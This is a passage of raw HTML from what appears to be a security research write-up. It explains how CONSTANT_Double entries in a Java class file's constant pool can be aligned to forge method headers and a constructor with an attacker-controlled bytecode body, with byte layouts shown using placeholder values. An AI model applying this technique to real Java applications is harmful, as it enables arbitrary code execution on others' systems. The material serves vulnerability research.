font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">[</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">code_length</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">];</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 exception_table_length</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> &nbsp; u2 start_pc</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;u2 end_pc</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;u2 handler_pc</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;u2 catch_type</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> exception_table</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">[</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">exception_table_length</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">];</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 attributes_count</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;attribute_info attributes</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">[</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">attributes_count</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">];</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /></td></tr></tbody></table></div><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The methods table is a dynamically sized array of </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">method_info</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> structs. Each of these structs describes the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">access_flags</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> of the method, an index into the constant table that points to its name (as a utf8 constant), and another index pointing to the method descriptor (another CONSTANT_Utf8).&nbsp;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">This is followed by the attributes table, a dynamically sized map from Utf8 keys stored in the constant table to dynamically sized values stored inline. Fortunately, the only attribute we need to provide is the Code attribute, which contains the actual bytecode of the method.&nbsp;</span></p><br /><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Going back to our payload, we can see that the start of the methods table is aligned with the tag byte of the next entry in the constant pool table. This means that the 0x06 tag of a CONSTANT_Double will clobber the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">access_flag</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> field of the first method, making it unusable for us. Instead we have to create two methods: The first one as a basic filler to get the alignment right, and the second one as the actual constructor. Fortunately, the JVM ignores unknown attributes, so we can use dynamically sized attribute values. The graphic below shows how we use a series of CONST_DOUBLE entries to create a constructor method with an almost fully controlled body.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Roboto Mono&quot;, monospace; font-size: 6pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONST_DOUBLE: </span><span style="background-color: #fce5cd; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x06 0x01</span><span style="background-color: #fce5cd; color: #ff9900; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> 0xXX</span><span style="background-color: #fce5cd; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #fce5cd; color: #ff9900; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0xXX</span><span style="background-color: #fce5cd; color: #4a86e8; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> 0xYY 0xYY</span><span style="background-color: #fce5cd; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #fce5cd; color: #9900ff; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x00 0x01</span><span style="background-color: #fce5cd; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #fce5cd; color: magenta; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0xZZ</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Roboto Mono&quot;, monospace; font-size: 6pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONST_DOUBLE: </span><span style="background-color: #fce5cd; color: magenta; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x06</span><span style="background-color: #fce5cd; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #fce5cd; color: #0d904f; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x00 0x00 0x00 0x05</span><span style="background-color: #fce5cd; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #fce5cd; color: #c53929; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x00 0x00 0x00 0x00</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Roboto Mono&quot;, monospace; font-size: 6pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONST_DOUBLE: </span><span style="background-color: #fce5cd; color: #c53929; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x06</span><span style="background-color: #fce5cd; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #cfe2f3; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x00 0x01 </span><span style="background-color: #cfe2f3; color: #ff9900; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0xCC 0xCC</span><span style="background-color: #cfe2f3; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #cfe2f3; color: #4a86e8; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0xDD 0xDD</span><span style="background-color: #cfe2f3; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #cfe2f3; color: #9900ff; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x00 0x03</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Roboto Mono&quot;, monospace; font-size: 6pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONST_DOUBLE: </span><span style="background-color: #c9daf8; color: magenta; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x06</span><span style="background-color: #c9daf8; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #c9daf8; color: magenta; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x00</span><span style="background-color: #c9daf8; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #c9daf8; color: #0f9d58; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x00</span><span style="background-color: #c9daf8; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #c9daf8; color: #0d904f; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x00</span><span style="background-color: #c9daf8; color: #ff9900; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #c9daf8; color: #0d904f; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x00</span><span style="background-color: #c9daf8; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #c9daf8; color: #0d904f; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x04</span><span style="background-color: #c9daf8; color: #4a86e8; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #c9daf8; color: #c53929; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x00 0x00 0x00</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Roboto Mono&quot;, monospace; font-size: 6pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONST_DOUBLE: </span><span style="background-color: #c9daf8; color: #c53929; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x06</span><span style="background-color: #c9daf8; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #c9daf8; color: magenta; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0xCC</span><span style="background-color: #c9daf8; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #c9daf8; color: magenta; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0xDD</span><span style="background-color: #c9daf8; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #c9daf8; color: #0d904f; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0xZZ</span><span style="background-color: #c9daf8; color: #ff9900; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #c9daf8; color: #0d904f; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0xZZ</span><span style="background-color: #c9daf8; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #c9daf8; color: #0d904f; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0xZZ</span><span style="background-color: #c9daf8; color: #4a86e8; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #c9daf8; color: #0d904f; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0xZZ</span><span style="background-color: #c9daf8; color: #c53929; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> 0xAA 0xAA</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Roboto Mono&quot;, monospace; font-size: 6pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONST_DOUBLE: </span><span style="background-color: #c9daf8; color: #c53929; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x06 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Roboto Mono&quot;, monospace; font-size: 6pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONST_DOUBLE: </span><span style="background-color: #c9daf8; color: #c53929; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x06 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Roboto Mono&quot;, monospace; font-size: 6pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONST_DOUBLE: </span><span style="background-color: #c9daf8; color: #c53929; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x06 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Roboto Mono&quot;, monospace; font-size: 6pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CONST_DOUBLE: </span><span style="background-color: #c9daf8; color: #c53929; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x06 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA 0xAA</span></p><br /><div align="center" dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup><col width="333"></col></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #fce5cd; border-bottom: solid #000000 1pt; border-left: solid #000000 1pt; border-right: solid #000000 1pt; border-top: solid #000000 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">First Method Header</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">access_flags 0x0601</span><span style="background-color: transparent; color: #38761d; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #ff9900; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">name_index&nbsp; 0xXXXX</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #4a86e8; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">desc_index 0xYYYY</span><span style="background-color: transparent; color: #ff9900; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #9900ff; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">attr_count 0x0001</span></p></td></tr><tr style="height: 20pt;"><td rowspan="3" style="background-color: #fce5cd; border-bottom: solid #000000 1pt; border-left: solid #000000 1pt; border-right: solid #000000 1pt; border-top: solid #000000 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">Attribute [0]</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: magenta; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">name_index 0xZZ06</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #0d904f; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">length 0x00000005</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #c53929; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">data &nbsp; \x00\x00\x00\x00\x06</span></p><br /></td></tr><tr style="height: 20pt;"></tr><tr style="height: 0pt;"></tr><tr style="height: 20pt;"><td style="background-color: #c9daf8; border-bottom: solid #000000 1pt; border-left: solid #000000 1pt; border-right: solid #000000 1pt; border-top: solid #000000 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">Second Method Header</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">access_flags 0x0001</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #ff9900; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">name_index&nbsp; 0xCCCC -&gt; &lt;init&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #4a86e8; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">desc_index 0xDDDD</span><span style="background-color: transparent; color: #ff9900; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp; -&gt; ()V</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #9900ff; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">attr_count 0x0003</span><span style="background-color: transparent; color: magenta; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;</span></p><br /></td></tr><tr style="height: 20pt;"><td style="background-color: #c9daf8; border-bottom: solid #000000 1pt; border-left: solid #000000 1pt; border-right: solid #000000 1pt; border-top: solid #000000 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; 